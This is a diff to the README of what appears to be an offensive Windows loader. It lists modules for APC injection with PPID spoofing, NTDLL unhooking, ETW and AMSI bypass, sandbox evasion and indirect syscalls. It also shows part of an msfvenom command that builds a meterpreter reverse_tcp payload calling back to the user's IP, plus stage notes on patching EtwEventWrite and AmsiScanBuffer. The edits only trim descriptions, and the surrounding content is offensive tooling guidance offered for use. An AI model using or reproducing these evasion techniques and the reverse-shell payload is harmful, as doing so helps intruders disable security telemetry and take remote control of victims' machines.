@@ -18,9 +18,9 @@ modules/
   ├── injection.c    - APC injection + PPID spoofing
   ├── unhooking.c    - Clean NTDLL restoration
   ├── etw_bypass.c   - Disable ETW telemetry
-  ├── amsi_bypass.c  - Neutralize AMSI (anti-powershell)
+  ├── amsi_bypass.c  - Neutralize AMSI
   ├── sandbox_evasion.c - VM/sandbox detection
-  └── syscalls.c     - Indirect syscalls (bypass hooks)
+  └── syscalls.c     - Indirect syscalls
 ```
 
 ## Quick build
@@ -49,7 +49,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 EXITF
 - Flush instruction cache
 
 **Stage 3: ETW/AMSI bypass**
-- Patch EtwEventWrite (Windows telemetry)
+- Patch EtwEventWrite
 - Patch AmsiScanBuffer if loaded
 
 **Stage 4: Injection**
